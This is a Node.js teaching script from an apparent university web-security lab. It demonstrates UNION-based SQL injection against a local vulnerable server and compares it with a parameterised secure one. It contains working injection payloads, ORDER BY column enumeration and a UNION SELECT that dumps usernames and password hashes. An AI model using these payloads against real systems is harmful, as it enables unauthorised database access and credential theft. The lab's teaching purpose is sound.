/**
 * demo_sqli2.js — SQL Injection V2 (UNION-based extraction) demo
 * IT-30001 Web Security Lab — Coursework use only (local targets)
 *
 * Run:  node demo_sqli2.js
 *
 * Targets:
 *   Vulnerable  → http://localhost:3000/products  (flaws present)
 *   Secure      → http://localhost:3001/products  (parameterised query)
 */

const VULNERABLE_URL = 'http://localhost:3000/products';
const SECURE_URL     = 'http://localhost:3001/products';

// ANSI colours for terminal output
const C = {
  reset:  '\x1b[0m',
  bold:   '\x1b[1m',
  red:    '\x1b[31m',
  green:  '\x1b[32m',
  yellow: '\x1b[33m',
  cyan:   '\x1b[36m',
  grey:   '\x1b[90m',
  white:  '\x1b[97m',
  bgRed:  '\x1b[41m',
  bgGreen:'\x1b[42m',
};

const banner = (msg, color) =>
  console.log(`\n${color}${C.bold} ${msg} ${C.reset}`);

const info  = (msg) => console.log(`  ${C.cyan}ℹ${C.reset}  ${msg}`);
const ok    = (msg) => console.log(`  ${C.green}✔${C.reset}  ${msg}`);
const fail  = (msg) => console.log(`  ${C.red}✖${C.reset}  ${msg}`);
const step  = (n, msg) => console.log(`\n${C.yellow}${C.bold}[Step ${n}]${C.reset} ${msg}`);
const sep   = () => console.log(`${C.grey}${'─'.repeat(62)}${C.reset}`);

// ── Fetch helpers ────────────────────────────────────────────────

async function search(baseUrl, payload) {
  const url = `${baseUrl}?q=${encodeURIComponent(payload)}`;
  const res  = await fetch(url);
  const html = await res.text();
  return { status: res.status, html };
}

// Very small HTML table parser — pulls <td> text out of each <tr>
function parseTableRows(html) {
  const rows = [];
  const trRe = /<tr>([\s\S]*?)<\/tr>/gi;
  const tdRe = /<td>([\s\S]*?)<\/td>/gi;
  let trMatch;
  while ((trMatch = trRe.exec(html)) !== null) {
    const cells = [];
    let tdMatch;
    const inner = trMatch[1];
    while ((tdMatch = tdRe.exec(inner)) !== null) {
      // Strip any inner HTML tags, decode basic entities
      cells.push(
        tdMatch[1]
          .replace(/<[^>]+>/g, '')
          .replace(/&amp;/g, '&')
          .replace(/&lt;/g, '<')
          .replace(/&gt;/g, '>')
          .replace(/&quot;/g, '"')
          .trim()
      );
    }
    if (cells.length) rows.push(cells);
  }
  return rows;
}

function hasError(html) {
  return html.includes('msg-error') || html.includes('Something went wrong');
}

function printTable(rows, headers = ['ID', 'Name / Username', 'Price / Password Hash']) {
  const w = [6, 20, 68];
  const line = '─'.repeat(w[0] + w[1] + w[2] + 10);
  const pad  = (s, n) => String(s ?? '').padEnd(n).slice(0, n);

  console.log(`\n  ${C.grey}┌${line}┐${C.reset}`);
  console.log(`  ${C.grey}│${C.reset} ${C.bold}${pad(headers[0], w[0])}  ${pad(headers[1], w[1])}  ${pad(headers[2], w[2])}${C.reset} ${C.grey}│${C.reset}`);
  console.log(`  ${C.grey}├${line}┤${C.reset}`);
  for (const r of rows) {
    const id   = r[0] ?? '';
    const name = r[1] ?? '';
    const val  = r[2] ?? '';
    const nameColor = name.length > 12 ? C.red : C.white;  // hashes are long → red
    console.log(`  ${C.grey}│${C.reset} ${pad(id, w[0])}  ${nameColor}${pad(name, w[1])}${C.reset}  ${C.yellow}${pad(val, w[2])}${C.reset} ${C.grey}│${C.reset}`);
  }
  console.log(`  ${C.grey}└${line}┘${C.reset}`);
}

// ── Main demo ────────────────────────────────────────────────────

async function main() {
  console.clear();
  console.log(`\n${C.bold}${C.white}╔══════════════════════════════════════════════════════════════╗`);
  console.log(`║      SQL Injection V2 — UNION-based Extraction Demo          ║`);
  console.log(`║      IT-30001 Web Security Lab  (local use only)             ║`);
  console.log(`╚══════════════════════════════════════════════════════════════╝${C.reset}`);

  // ── PHASE 1: Verify baseline ──────────────────────────────────
  banner('PHASE 1 — Baseline (Normal Search)', C.bgGreen);
  step(1, 'Normal search: q=Laptop on VULNERABLE instance');
  info(`GET ${VULNERABLE_URL}?q=Laptop`);

  const { html: baseHtml } = await search(VULNERABLE_URL, 'Laptop');
  const baseRows = parseTableRows(baseHtml);
  if (baseRows.length) {
    ok(`Got ${baseRows.length} row(s) — server is reachable and DB is seeded.`);
    printTable(baseRows, ['ID', 'Name', 'Price']);
  } else {
    fail('No rows returned — is the server running on :3000?');
    process.exit(1);
  }

  // ── PHASE 2: Column count enumeration ────────────────────────
  banner('PHASE 2 — Column Count Enumeration (ORDER BY)', C.bgRed);
  info('Trying ORDER BY n until an error occurs to find column count.\n');

  let columnCount = 0;
  for (let n = 1; n <= 6; n++) {
    const payload = `Laptop' ORDER BY ${n}--`;
    const { status, html } = await search(VULNERABLE_URL, payload);
    const errored = hasError(html) || status === 500;
    const sym = errored ? `${C.red}✖ ERROR${C.reset}` : `${C.green}✔ OK${C.reset}   `;
    console.log(`  ORDER BY ${n} → ${sym}  ${C.grey}(payload: ${payload})${C.reset}`);
    if (errored && columnCount === 0) columnCount = n - 1;
  }

  sep();
  if (columnCount > 0) {
    ok(`Column count confirmed: ${C.bold}${columnCount}${C.reset}`);
  } else {
    fail('Could not determine column count — all ORDER BY succeeded (unexpected).');
  }

  // ── PHASE 3: UNION extraction on VULNERABLE instance ─────────
  banner('PHASE 3 — UNION SELECT extraction on VULNERABLE :3000', C.bgRed);

  const unionPayload = `zzz' UNION SELECT id,username,password FROM users--`;
  step(2, 'Injecting UNION SELECT to dump the users table');
  info(`Payload: ${C.yellow}${unionPayload}${C.reset}`);
  info(`GET ${VULNERABLE_URL}?q=${encodeURIComponent(unionPayload)}\n`);

  const { html: vulnHtml } = await search(VULNERABLE_URL, unionPayload);
  const vulnRows = parseTableRows(vulnHtml);

  if (vulnRows.length > 0) {
    ok(`${C.bold}${C.red}INJECTION SUCCEEDED!${C.reset} Extracted ${vulnRows.length} record(s) from the users table:`);
    printTable(vulnRows, ['ID', 'Username', 'Password (SHA-256 Hash)']);
    console.log(`\n  ${C.grey}Tip: these are SHA-256 hashes, e.g. sha256("admin123") = ${C.reset}`);
    console.log(`  ${C.yellow}8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918${C.reset}\n`);
  } else {
    fail('No rows returned from UNION injection (unexpected).');
  }

  // ── PHASE 4: Same payload on SECURE instance ─────────────────
  banner('PHASE 4 — Same Payload on SECURE :3001 (Should Be Blocked)', C.bgGreen);

  step(3, 'Sending identical payload to SECURE instance');
  info(`GET ${SECURE_URL}?q=${encodeURIComponent(unionPayload)}\n`);

  const { html: secHtml } = await search(SECURE_URL, unionPayload);
  const secRows = parseTableRows(secHtml);
  const secError = hasError(secHtml);

  if (secRows.length === 0 && secError) {
    ok(`${C.bold}${C.green}BLOCKED — parameterised query prevented the injection.${C.reset}`);
    ok('Generic error shown to user — no SQL detail leaked.');
  } else if (secRows.length === 0) {
    ok(`${C.bold}${C.green}BLOCKED — no rows returned (payload treated as literal string).${C.reset}`);
  } else {
    fail(`Secure instance returned rows — check the fix! (${secRows.length} rows)`);
    printTable(secRows);
  }

  // ── Summary ────────────────────────────────────────────────────
  sep();
  banner('SUMMARY', C.bgGreen);
  console.log(`
  ${C.bold}Root Cause (Vulnerable):${C.reset}
    User input is concatenated directly into the SQL string.
    The ${C.yellow}UNION SELECT${C.reset} keyword breaks out of the LIKE clause
    and appends a second query against the users table.

  ${C.bold}Fix (Secure):${C.reset}
    Parameterised query — ${C.green}db.prepare('... LIKE ?').all(\`%\${q}%\`)${C.reset}
    The SQL structure is fixed at parse time; input is bound
    as pure data and can never be interpreted as SQL.

  ${C.bold}Affected endpoint:${C.reset}  GET /products?q=
  ${C.bold}Vulnerable port:${C.reset}   :3000   ${C.red}(flaws present)${C.reset}
  ${C.bold}Secure port:${C.reset}       :3001   ${C.green}(parameterised + safe errors)${C.reset}
`);
  sep();
}

main().catch((e) => {
  console.error(`\n${C.red}Fatal error:${C.reset}`, e.message);
  console.error('Make sure the server is running: npm start');
  process.exit(1);
});
